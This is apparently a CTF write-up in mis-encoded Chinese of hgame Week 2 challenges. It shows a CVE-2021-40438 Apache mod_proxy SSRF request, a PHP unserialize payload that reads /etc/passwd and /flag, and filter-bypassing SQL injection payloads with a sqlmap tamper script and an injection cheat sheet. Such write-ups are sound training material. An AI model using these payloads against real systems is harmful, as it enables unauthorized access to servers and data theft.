./httpd-vhosts.conf:/usr/local/apache2/conf/extra/httpd-vhosts.conf links: - internal.host depends_on: - internal.host ports: - 60010:80 nginx: image: nginx:alpine container_name: internal.host volumes: - ./default.conf:/etc/nginx/conf.d/default.conf default.conf server { listen 80; server_name localhost; #access_log /var/log/nginx/host.access.log main; location / { root /usr/share/nginx/html; index index.html index.htm; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html { root /usr/share/nginx/html; } location = /flag { return 200 \"hgame{xxx}\"; } # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ { # proxy_pass http://127.0.0.1; #} # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \\.php$ { # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #} # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\\.ht { # deny all; #} } httpd-vhosts.conf &lt;VirtualHost *:80&gt; ServerAdmin webmaster@summ3r.top DocumentRoot \"/usr/local/apache2/htdocs\" ServerName dummy-host.example.com ServerAlias www.dummy-host.example.com ErrorLog \"logs/dummy-host.example.com-error_log\" CustomLog \"logs/dummy-host.example.com-access_log\" common &lt;Location /proxy&gt; ProxyPass https://www.google.com &lt;/Location&gt; &lt;/VirtualHost&gt; è¯·æ±‚æ˜¯ä» Apache/2.4.48 (Unix) è¿›æ¥çš„ï¼Œå†…ç½‘æœ‰ä¸ª nginxï¼Œflagåœ¨ä»–çš„ /flag è·¯ç”±ä¸‹ã€‚ ç›´æ¥è®¿é—®çš„è¯ï¼Œä¼šæç¤ºè®¿é—®å†…ç½‘é‚£ä¸ªã€‚ æœä¸€æœ Apache/2.4.48 æœ‰å•¥æ´ï¼Œå…¶å®æœ€å¼€å§‹æƒ³åˆ°çš„æ˜¯é‚£ä¸ª .%2e ç›®å½•ç©¿è¶Šçš„æ´ï¼Œä¸è¿‡æ˜¯åœ¨ 2.4.49 - 2.4.50 https://httpd.apache.org/security/vulnerabilities_24.html çœ‹èµ·æ¥æ˜¯å’Œ mod_proxy æœ‰å…³çš„ å†åˆ° GitHub æœæœ PoC CVE-2021-40438 exploit PoC with Docker setup CVE-2021-40438 è¯·æ±‚ uri-path å¯ä»¥å¯¼è‡´ mod_proxy å°†è¯·æ±‚è½¬å‘åˆ°è¿œç¨‹ç”¨æˆ·é€‰æ‹©çš„æºæœåŠ¡å™¨ã€‚æ­¤é—®é¢˜ä¼šå½±å“ Apache HTTP Server 2.4.48 åŠæ›´æ—©ç‰ˆæœ¬ã€‚ æ”»å‡»è€…å¯ä»¥é€šè¿‡åˆ¶ä½œè¯·æ±‚æ¥åˆ©ç”¨æ­¤æ¼æ´uriè·¯å¾„ï¼Œè¿™å¯¼è‡´ mod_proxyå°†è¯·æ±‚è½¬å‘åˆ°æ”»å‡»è€…é€‰æ‹©çš„æºæœåŠ¡å™¨ã€‚Apache HTTP Serverçš„mod_proxyç»„ä»¶æ—¨åœ¨ä¸º Apache HTTP Server å®ç°ä»£ç†/ç½‘å…³åŠŸèƒ½ã€‚ Apache &lt;= 2.4.48 - Mod_Proxy SSRF proxy ç”¨çš„æ˜¯ /proxy è·¯ç”±ï¼Œæ‰€ä»¥æœ€ç»ˆ payload: GET /proxy?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://internal.host/flag HTTP/1.1 Host: httpd.summ3r.top User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache hgame{COng@tul4ti0n~u_r3prOduced_CVE-2021-40438} ä¸€æœ¬å•è¯ä¹¦ Description ä¸ºäº†é¡ºåˆ©é€šè¿‡å…­çº§ï¼ŒSumm3rç”¨ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å†™äº†ä¸ªå•è¯ä¹¦ï¼Œå˜¿å˜¿å˜¿ Challenge Address https://wordbook.hgame.potat0.cc/ /www.zip æºç  login.php &lt;?php session_start(); function alert($msg): string { return \"&lt;script&gt;alert('\".$msg.\"')&lt;/script&gt;\"; } function randomString($length): string { srand(time()); $s = \"\"; for ($i=0; $i&lt;$length; $i++) { $s .= chr(random_int(32, 127)); } return $s; } if ($_SERVER['REQUEST_METHOD'] == 'POST') { if (!isset($_POST['username']) || !isset($_POST['password'])) { return; } if ($_POST['username'] != 'adm1n') { die(alert('username or password is invalid')); } if (is_numeric($_POST['password'])) { die(alert('å¯†ç ä¸èƒ½è®¾ç½®ä¸ºçº¯æ•°å­—ï¼Œæˆ‘å¦ˆéƒ½çŸ¥é“(ï¿£â–³ï¿£ï¼›)')); } else { if ($_POST['password'] == 1080) { $_SESSION['username'] = 'admin'; $_SESSION['unique_key'] = md5(randomString(8)); header('Location: index.php'); } else { die(alert('è¿™ä½ éƒ½èƒ½è¾“é”™ï¼Ÿ')); } } } ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;link href=\"static/login.css\" rel=\"stylesheet\"&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=\"login.php\" method=\"POST\"&gt; &lt;div class=\"form-item\"&gt; &lt;label for=\"username\"&gt;USERNAME&lt;/label&gt; &lt;input type=\"text\" name=\"username\" id=\"username\"&gt; &lt;/div&gt; &lt;div class=\"form-item\"&gt; &lt;label for=\"password\"&gt;PASSWORD&lt;/label&gt; &lt;input type=\"password\" name=\"password\"&gt; &lt;/div&gt; &lt;div class=\"form-item\"&gt; &lt;button type=\"submit\"&gt;LOGIN&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/body&gt; &lt;!-- hint: /www.zip --&gt; &lt;/html&gt; &lt;?php ?&gt; ç”¨æˆ·åå¯†ç å¼±æ¯”è¾ƒç»•è¿‡å°±è¡Œ adm1n / 1080a ç™»å½• save.php &lt;?php session_start(); include 'admin_check.php'; function encode($data): string { $result = ''; foreach ($data as $k =&gt; $v) { $result .= $k . '|' . serialize($v); } return $result; } function saveSessionData() { $filename = \"/tmp/\".$_SESSION['unique_key'].'.session'; $data = json_decode(file_get_contents(\"php://input\")); $str = encode($data); file_put_contents($filename, $str, FILE_APPEND); } if ($_SERVER['REQUEST_METHOD'] == 'POST') { saveSessionData(); } else { echo 'method not allowed'; } get.php &lt;?php session_start(); include 'admin_check.php'; include 'evil.php'; // flag is in /flag function decode(string $data): Array { $result = []; $offset = 0; $length = \\strlen($data); while ($offset &lt; $length) { if (!strstr(substr($data, $offset), '|')) { return []; } $pos = strpos($data, '|', $offset); $num = $pos - $offset; $varname = substr($data, $offset, $num); $offset += $num + 1; $dataItem = unserialize(substr($data, $offset)); $result[$varname] = $dataItem; $offset += \\strlen(serialize($dataItem)); } return $result; } function loadSessionData(): Array { $filename = '/tmp/'.$_SESSION['unique_key'].'.session'; if (file_exists($filename)) { $str = file_get_contents($filename); return decode($str); } else { file_put_contents($filename, ''); return []; } } echo json_encode(loadSessionData()); evil.php &lt;?php class Evil { public $file; public $flag; public function __wakeup() { $content = file_get_contents($this-&gt;file); if (preg_match(\"/hgame/\", $content)) { $this-&gt;flag = 'hacker!'; } $this-&gt;flag = $content; } } ç”±äº $varname çš„é•¿åº¦æ˜¯åˆ°ç¬¬ä¸€ä¸ªå‡ºç°çš„ | å¼€å§‹è®¡ç®—çš„ï¼Œå°±å¯ä»¥åœ¨ save çš„æ—¶å€™æŠŠ key ä¸­åŠ å…¥ |ï¼Œè§£æçš„æ—¶å€™å°±ä¼šæŠŠåé¢çš„å†…å®¹ä¸¢å»ååºåˆ—åŒ–äº†ã€‚ ä¾‹å¦‚è¯»ä¸ª /etc/passwdï¼Œpayload: 2|O:4:\"Evil\":2:{s:4:\"file\";s:11:\"/etc/passwd\";s:4:\"flag\";N;} 1 æœ¬åœ°è°ƒè¯•çš„è¯å¯ä»¥çœ‹çœ‹ session æœ€åçš„è¯è¿˜è¦è®©è¾“å‡ºå¾—åˆ°çš„ç»“æœä¸åŒ…å« hgameï¼Œè¿™ä¸ªç®€å•ï¼Œæ‹¿ php ä¼ªåè®® base64 ç¼–ç ä¸€ä¸‹å°±å®Œäº‹äº†ã€‚ ç”Ÿæˆ payload çš„è„šæœ¬ï¼š &lt;?php class Evil { public $file; public $flag; public function __construct() { // $this-&gt;file = \"/etc/passwd\"; $this-&gt;file = \"php://filter/read=convert.base64-encode/resource=/flag\"; } } echo serialize(new Evil()); Payload: miaotony|O:4:\"Evil\":2:{s:4:\"file\";s:54:\"php://filter/read=convert.base64-encode/resource=/flag\";s:4:\"flag\";N;} 233 hgame{Uns@f3_D3seR1@liz4t1On!Is~h0rr1b1e-!n_PhP} Pokemon Description é€‰æ‹©ä½ çš„å®å¯æ¢¦å§ï¼Œå¬å”¤å¸ˆï¼ Challenge Address http://121.43.141.153:60056 è¯•äº†è¯•è¿™ä¸ªæ³¨å…¥ï¼Œå‘ç°æ²¡æœ‰ã€‚ é‚£éå†è·‘è·‘ï¼Œå—¯ï¼Œé™¤äº†1-3å…¶ä»–éƒ½æ˜¯ Location: error.php?code=404 é‚£è¦æ˜¯åŠ ä¸ª ' å‘¢ï¼Ÿ å¾ˆå¥½ï¼Œæœ‰æ•°æ®åº“ï¼ŒæŠ¥é”™å•¦ï¼ å‘ç°ä¼šæŠŠ or and /**/ select union from where è¿™äº›ç»™æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™å¯ä»¥ç»•è¿‡ã€‚ç»“å°¾ç”¨ #(%23) å¯ä»¥ã€‚ - + ç©ºæ ¼ ä¼šæ›¿æ¢ä¸ºç©º \" =&gt; &amp;quot;ï¼ˆurlencodeï¼‰ï¼Œ&lt;&gt; ç±»ä¼¼ GET /error.php?code=403/*/**/*/anAndd/*/**/*/sleep(3)%23 æˆåŠŸ sleep ç„¶å union select è¯»ä¿¡æ¯ payload: GET /error.php?code=404/*/**/*/UNIunionON/*/**/*/ALL/*/**/*/SELselectECT/*/**/*/NULL,database()%23 ===&gt; database: pokemon GET /error.php?code=404/*/**/*/UNIunionON/*/**/*/ALL/*/**/*/SELselectECT/*/**/*/NULL,group_concat(table_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.tables/*/**/*/whwhereere/*/**/*/table_schema/*/**/*/like/*/**/*/database()%23 ===&gt; è¡¨å errors,fllllllllaaaaaag GET /error.php?code=404/*/**/*/UNIunionON/*/**/*/ALL/*/**/*/SELselectECT/*/**/*/NULL,group_concat(column_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.columns/*/**/*/whewherere/*/**/*/table_name/*/**/*/like/*/**/*/'fllllllllaaaaaag'%23 ===&gt; åˆ—å flag GET /error.php?code=404/*/**/*/UNIunionON/*/**/*/ALL/*/**/*/SELselectECT/*/**/*/NULL,flag/*/**/*/frofromm/*/**/*/fllllllllaaaaaag%23 hgame{C0n9r@tul4tiOn#Y0u$4r3_sq1_M4ST3R^} é¡ºä¾¿è¯•äº†è¯• sqlmapï¼Œéœ€è¦å†™ä¸ª tamperï¼Œæ”¾åœ¨ /usr/share/sqlmap/tamper ç›®å½•ä¸‹ doublewords.py #!/usr/bin/env python ''' sqlmap åŒå†™ç»•è¿‡ Modified by MiaoTony ''' from lib.core.compat import xrange from lib.core.enums import PRIORITY __priority__ = PRIORITY.LOW def dependencies(): pass def tamper(payload, **kwargs): payload= payload.lower() payload= payload.replace('union' , 'uniunionon') payload= payload.replace('select' , 'selselectect') payload= payload.replace('from' , 'frfromom') payload= payload.replace('where' , 'whewherere ') payload= payload.replace('or' , 'oorr') payload= payload.replace('=' , ' like ') payload= payload.replace(' ' , '/*/**/*/') payload= payload.replace('and' , 'anandd') retVal=payload return retVal éœ€è¦æ›¿æ¢çš„æ˜¯è¯•å‡ºæ¥çš„ï¼ˆ sqlmap -u \"http://121.43.141.153:60056/error.php?code=404\" --random-agent --tamper=doublewords -D pokemon --dump é¡ºä¾¿è®°å½•ä¸€ä¸‹ æ‰‹å·¥ SQL æ³¨å…¥çš„ç»å…¸ payloadã€‚ order by --+ åˆ¤æ–­å­—æ®µæ•°ç›® union select --+ è”åˆæŸ¥è¯¢æ”¶é›†ä¿¡æ¯ id=1' and 1=2 UNION SELECT 1,2,database() --+ æŸ¥è¯¢å½“å‰æ•°æ®åº“ id=1' and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata --+æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“ id=1' and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ æŸ¥è¯¢è¡¨å id=1' and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+ æŸ¥è¯¢åˆ—å id=1' and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users --+ æŸ¥è¯¢å­—æ®µå€¼ via å›½å…‰å¸ˆå‚…çš„ MySQL æ‰‹å·¥æ³¨å…¥ä¹‹åŸºæœ¬æ­¥éª¤ æœ‰ç‚¹äºï¼Œæ²¡æŠ¢åˆ°ä¸€è¡€ï¼ŒäºŒè¡€ä¹Ÿå¥½å•¦ 2333ã€‚ Miscä¸€å¼ æ€ªæ€ªçš„åç‰‡ Description é¸¿å¸ˆå‚…ç»™å¥³å‹é€äº†ä¸ª flag ï¼Œä½†æ˜¯ç°åœºåªæœ‰ä¸€ä¸ªå¥‡æ€ªçš„åç‰‡ã€‚PSï¼šé¸¿å¸ˆå‚…ä¸å–œæ¬¢ç™¾åº¦ Challenge Address https://potat0-1308188104.cos.ap-shanghai.myqcloud.com/Week2/%E4%B8%80%E5%BC%A0%E6%80%AA%E6%80%AA%E7%9A%84%E5%90%8D%E7%89%87.png å¼€å±€æ‹¼äºŒç»´ç ï¼Œå¥½çƒ¦è¿™ç§é¢˜å•Šï¼ï¼ï¼ ç„¶åå†æŠ˜è…¾æŠ˜è…¾ï¼Œå‘ç°è¿˜æ˜¯æ‰«ä¸äº†ï¼Œåååï¼ï¼ï¼ ä¸è¡Œè¿˜æ˜¯ä¸Š qrazybox å§ 